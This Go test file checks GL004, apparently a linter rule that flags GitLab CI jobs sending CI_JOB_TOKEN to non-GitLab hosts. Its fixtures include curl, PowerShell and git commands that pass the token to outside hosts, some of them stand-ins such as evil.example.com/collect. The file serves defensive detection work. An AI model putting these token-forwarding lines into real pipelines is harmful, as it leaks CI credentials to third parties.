// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
)

func findings004(t *testing.T, yaml string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(yaml), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return GL004.Check(doc.Root, "test.yml")
}

func TestGL004_ExternalHost(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://third-party.com/api/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if f[0].Severity != finding.Warn {
		t.Errorf("expected Warn severity")
	}
}

func TestGL004_TokenInURL(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl https://external.example.com/upload?token=$CI_JOB_TOKEN
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for token in URL, got %d", len(f))
	}
}

func TestGL004_GitLabComSafe(t *testing.T) {
	f := findings004(t, `
download:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://gitlab.com/api/v4/packages
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for gitlab.com, got %d", len(f))
	}
}

func TestGL004_GitLabSubdomainSafe(t *testing.T) {
	f := findings004(t, `
download:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://registry.gitlab.com/my-project
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for gitlab.com subdomain, got %d", len(f))
	}
}

func TestGL004_NoURL(t *testing.T) {
	f := findings004(t, `
build:
  script:
    - ./deploy.sh --token $CI_JOB_TOKEN
`)
	if len(f) != 0 {
		t.Errorf("expected no findings when no explicit URL present, got %d", len(f))
	}
}

func TestGL004_BraceForm(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=${CI_JOB_TOKEN} https://external.com/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for brace form, got %d", len(f))
	}
}

func TestGL004_PowerShellEnvForm(t *testing.T) {
	f := findings004(t, `
upload:
  tags: [windows]
  script:
    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://example.com/upload'
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for PowerShell $env:CI_JOB_TOKEN, got %d: %v", len(f), f)
	}
}

func TestGL004_PowerShellBraceEnvForm(t *testing.T) {
	f := findings004(t, `
upload:
  tags: [windows]
  script:
    - 'Invoke-RestMethod -Uri https://example.com/upload -Headers @{"JOB-TOKEN"=${env:CI_JOB_TOKEN}}'
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for PowerShell ${env:CI_JOB_TOKEN}, got %d: %v", len(f), f)
	}
}

func TestGL004_PowerShellLowercaseEnvForm(t *testing.T) {
	f := findings004(t, `
upload:
  tags: [windows]
  script:
    - 'iwr -Headers @{"JOB-TOKEN"=$env:ci_job_token} https://example.com/upload'
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for lowercase PowerShell $env:ci_job_token, got %d: %v", len(f), f)
	}
}

func TestGL004_PowerShellAliasIRM(t *testing.T) {
	f := findings004(t, `
upload:
  tags: [windows]
  script:
    - 'irm https://example.com/upload -Headers @{"JOB-TOKEN"=$Env:CI_JOB_TOKEN}'
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for irm with $Env:CI_JOB_TOKEN, got %d: %v", len(f), f)
	}
}

func TestGL004_PowerShellGitLabSafe(t *testing.T) {
	f := findings004(t, `
download:
  tags: [windows]
  script:
    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://gitlab.com/api/v4/projects/1/packages'
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for PowerShell token to gitlab.com, got %d: %v", len(f), f)
	}
}

func TestGL004_PosixLowercaseNoFinding(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - 'curl -H "JOB-TOKEN: $ci_job_token" https://example.com/upload'
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for lowercase POSIX $ci_job_token, got %d: %v", len(f), f)
	}
}

func TestGL004_BeforeScript(t *testing.T) {
	f := findings004(t, `
build:
  before_script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://external.com/setup
  script:
    - make
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding in before_script, got %d", len(f))
	}
}

func TestGL004_GitCloneWithToken(t *testing.T) {
	f := findings004(t, `
build:
  script:
    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/org/repo.git
`)
	if len(f) != 0 {
		t.Errorf("expected no findings for git clone to gitlab.com with token in userinfo, got %d", len(f))
	}
}

func TestGL004_ExternalUserinfoURL(t *testing.T) {
	f := findings004(t, `
build:
  script:
    - curl https://user:$CI_JOB_TOKEN@external.com/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for token sent to external host via userinfo, got %d", len(f))
	}
	if f[0].Message != `CI_JOB_TOKEN sent to non-GitLab host "external.com" — this token is scoped to the GitLab API and should not be forwarded to external services` {
		t.Errorf("unexpected message: %s", f[0].Message)
	}
}

func TestGL004_SelfHostedGitLabAdvice(t *testing.T) {
	f := findings004(t, `
pages:
  script:
    - curl -X POST -F "token=$CI_JOB_TOKEN" https://gitlab.example.org/api/v4/projects/42/trigger/pipeline
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for token sent to GitLab-shaped URL on a foreign host, got %d", len(f))
	}
	want := `CI_JOB_TOKEN sent to hardcoded GitLab host "gitlab.example.org" — if this is the instance running the pipeline, use $CI_API_V4_URL / $CI_SERVER_HOST so the token can't go to another instance after a move or fork`
	if f[0].Message != want {
		t.Errorf("unexpected message:\n got: %s\nwant: %s", f[0].Message, want)
	}
}

// The advice only fits URLs shaped like a GitLab instance's. A job-token
// clone of another forge keeps the original message (#864 review).
func TestGL004_SelfHostedGitLabAdviceShapes(t *testing.T) {
	for _, tc := range []struct {
		line   string
		gitlab bool
	}{
		{`curl -fsSL -o a.zip "https://ci.example.org/group/project/-/jobs/artifacts/main/download?job=build&job_token=$CI_JOB_TOKEN"`, true},
		{`curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://GitLab.Example.Org/API/V4/projects/42/packages`, true},
		{`curl -X POST -F "token=$CI_JOB_TOKEN" https://ci.example.org/api/v4/projects/42/Trigger/Pipeline`, true},
		{`git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@github.com/org/repo.git`, false},
		{`curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://external-registry.example.com/upload`, false},
	} {
		f := findings004(t, "job:\n  script:\n    - '"+strings.ReplaceAll(tc.line, "'", "''")+"'\n")
		if len(f) != 1 {
			t.Errorf("%s: got %d findings, want 1", tc.line, len(f))
			continue
		}
		if got := strings.Contains(f[0].Message, "hardcoded GitLab host"); got != tc.gitlab {
			t.Errorf("%s: GitLab advice = %v, want %v\n%s", tc.line, got, tc.gitlab, f[0].Message)
		}
	}
}

func TestGL004_LineNumbers(t *testing.T) {
	f := findings004(t, `
upload:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://external.com/upload
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding")
	}
	if f[0].Line == 0 {
		t.Error("expected non-zero line number")
	}
}

func TestGL004_PerCommand(t *testing.T) {
	for _, tc := range []struct {
		name, script string
		want         int
		host         string
	}{
		{"token to external host", `curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://evil.example.com/collect`, 1, "evil.example.com"},
		{"--url= form", `tool --token "$CI_JOB_TOKEN" --url=https://evil.example.com`, 1, "evil.example.com"},
		{"git clone with userinfo", `git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@github.com/org/repo.git`, 1, "github.com"},
		{"userinfo with variable host", `git remote set-url origin https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_FQDN}/${CI_PROJECT_PATH}.git`, 0, ""},
		{"oauth2 userinfo, variable host", `git clone https://oauth2:${CI_JOB_TOKEN}@$CI_SERVER_HOST/group/p.git`, 0, ""},
		{"URL as form value", `curl -F "token=$CI_JOB_TOKEN" -F "variables[URL]=https://campaign.example.com" $TRIGGER_URL`, 0, ""},
		{"URL in another command of the block", "echo \"Docs: https://docs.example.com/nuget\"\ndotnet nuget push p.nupkg --api-key \"$CI_JOB_TOKEN\" --source \"$CI_SERVER_URL/api/v4/projects/1/packages/nuget/index.json\"", 0, ""},
		{"gitlab.com", `curl -H "JOB-TOKEN: $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects`, 0, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc, err := parser.Parse([]byte("job:\n  script:\n    - |\n      "+strings.ReplaceAll(tc.script, "\n", "\n      ")+"\n"), "t.yml")
			if err != nil {
				t.Fatal(err)
			}
			f := GL004.Check(doc.Root, "t.yml")
			if len(f) != tc.want {
				t.Fatalf("expected %d findings, got %d: %v", tc.want, len(f), f)
			}
			if tc.want == 1 && !strings.Contains(f[0].Message, `"`+tc.host+`"`) {
				t.Errorf("message names the wrong host: %s", f[0].Message)
			}
		})
	}
}
